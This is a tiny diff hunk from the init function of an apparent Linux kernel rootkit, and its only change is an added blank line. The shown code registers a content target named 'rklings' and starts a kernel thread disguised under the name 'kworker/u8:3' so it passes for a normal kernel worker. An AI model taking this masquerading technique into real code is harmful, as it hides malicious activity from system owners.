@@ -76,6 +76,7 @@ static int __init rk_init(void)
 		goto fail_mkdirat;
 
 	rk_target_add(&rk_content_targets, "rklings");
+
 	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
 	if (IS_ERR(rk_thread)) {
 		ret = PTR_ERR(rk_thread);
